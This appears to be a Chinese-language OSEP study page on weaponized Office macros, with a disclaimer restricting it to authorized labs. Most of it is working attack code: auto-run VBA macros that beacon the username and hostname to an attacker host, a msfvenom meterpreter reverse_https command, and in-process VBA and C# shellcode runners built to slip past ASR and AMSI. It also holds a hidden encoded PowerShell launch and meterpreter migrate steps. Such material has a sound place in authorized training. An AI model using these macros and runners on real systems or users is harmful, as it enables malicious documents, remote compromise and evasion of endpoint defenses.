# Office 宏

::: warning 仅供学习 / 授权实验
源码用于 OSEP 实验、考试环境和自建 lab。先做无害回调，再换真实 shellcode。禁止对未授权系统使用。
:::

## 判断顺序

1. 宏有没有跑 → 无害回调  
2. Office 是 32 还是 64 位 → 探测宏  
3. 能不能起 PowerShell → 不行就进程内 runner  
4. 文档关闭后会话在不在 → 迁移

## 无害回调（进程内 HTTP，不起子进程）

粘进 `ThisDocument`，另存 `.docm`。把 `LHOST` 换成攻击机。

```vb
Option Explicit
Private Const SERVER_URL As String = "http://LHOST/m01/callback"

Private Function HttpGet(ByVal url As String) As Boolean
    On Error GoTo fail
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send
    HttpGet = (http.Status >= 200 And http.Status < 300)
    Exit Function
fail:
    HttpGet = False
End Function

Private Sub DoCallback()
    Dim u As String, h As String
    On Error Resume Next
    u = Environ("USERNAME")
    h = Environ("COMPUTERNAME")
    On Error GoTo 0
    HttpGet SERVER_URL & "?u=" & u & "&h=" & h
End Sub

Private Sub RunOnce()
    Static fired As Boolean
    If Not fired Then fired = True: DoCallback
End Sub

Public Sub AutoOpen()
    RunOnce
End Sub
Public Sub Document_Open()
    RunOnce
End Sub
```

攻击机：`python3 -m http.server 80`，日志里要有 `/m01/callback`。

## 位数探测

```vb
Option Explicit
Private Const SERVER_URL As String = "http://LHOST:80/arch"

Private Sub SendProcessInfo()
    Dim wmi As Object, procs As Object, p As Object
    Dim result As String, is64 As Boolean
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='winword.exe'")
    If procs.Count > 0 Then
        For Each p In procs
            is64 = (InStr(1, p.CommandLine, "Program Files (x86)", vbTextCompare) = 0)
            result = "proc=winword&x64=" & CStr(is64)
        Next
    End If
    #If Win64 Then
        result = result & "&vba_x64=True"
    #Else
        result = result & "&vba_x64=False"
    #End If
    Shell "cmd.exe /c curl -s -X POST -d """ & result & """ " & SERVER_URL, vbHide
End Sub
Sub AutoOpen(): SendProcessInfo: End Sub
Sub Document_Open(): SendProcessInfo: End Sub
```

`vba_x64` 最可靠。32 位 Office 必须用 x86 shellcode + 非 PtrSafe 或对应声明。

## 进程内 VBA runner（x64 Office）

`Shell "powershell"` 被 ASR 杀掉时用这条。先生成：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread --encrypt xor --encrypt-key a -f vbapplication
```

把输出的数组贴进 `GetEncodedShellcode`。下面是骨架：

```vb
Option Explicit
#If Win64 Then

Private Const XOR_KEY As Byte = &H61   ' 'a'  与 msfvenom --encrypt-key 一致

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)

Sub RunShellcode()
    Dim mem As LongPtr, hThread As LongPtr, sc() As Byte, i As Long
    sc = GetEncodedShellcode()
    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1
    hThread = CreateThread(0, 0, mem, 0, 0, 0)
End Sub

Private Function GetEncodedShellcode() As Byte()
    ' 把 msfvenom -f vbapplication 的数组贴这里
    Dim buf As Variant
    buf = Array(0, 0, 0)   ' REPLACE
    Dim out() As Byte, i As Long
    ReDim out(UBound(buf))
    For i = 0 To UBound(buf): out(i) = buf(i): Next
    GetEncodedShellcode = out
End Function

Sub AutoOpen(): RunShellcode: End Sub
Sub Document_Open(): RunShellcode: End Sub
#End If
```

x86 Office 去掉 `PtrSafe`，`LongPtr` 改 `Long`，payload 用 `windows/meterpreter/...`（无 x64）。

## 宏只拉 PowerShell（无 CLM 时）

```vb
Sub AutoOpen()
    Shell "powershell -nop -w hidden -enc BASE64", vbHide
End Sub
```

第二阶段被 AMSI 拦 → [AppLocker 与 AMSI](/topics/applocker-amsi)。  
`Add-Type` 临时文件被删 → 改预编译 C# runner（见该页）。

## C# 预编译 runner（避免 Add-Type）

```bash
# 目标机
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe runner.cs
```

```csharp
using System;
using System.Runtime.InteropServices;

class Runner {
    // XOR 后的 shellcode 的 Base64；key 与生成时一致
    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
    private const byte XOR_KEY = 0x2A;

    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, UIntPtr st, IntPtr start, IntPtr par, uint f, out uint id);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

    static byte[] Decode() {
        byte[] d = Convert.FromBase64String(SHELLCODE_B64);
        for (int i = 0; i < d.Length; i++) d[i] ^= XOR_KEY;
        return d;
    }
    public static void Run() {
        byte[] sc = Decode();
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint tid;
        WaitForSingleObject(CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid), 2000);
    }
    static void Main() { Run(); }
}
```

生成 Base64：

```bash
python3 -c "import base64,sys; k=0x2A; d=open('sc.bin','rb').read();
print(base64.b64encode(bytes(b^k for b in d)).decode())"
```

## 生命周期

Word 关掉，未迁移的会话一起没。拿到会话立刻：

```
ps   # meterpreter
migrate -N explorer.exe
# 或 migrate <pid>
```

## 失败

| 现象 | 做法 |
|---|---|
| 无回调 | 宏安全 / 受保护视图 / 文件没被打开 |
| 有回调无 PS | ASR 拦子进程 → 进程内 runner |
| PS 起来脚本被拦 | AMSI |
| 崩溃 | 位数错 |
| 关文档就断 | migrate |
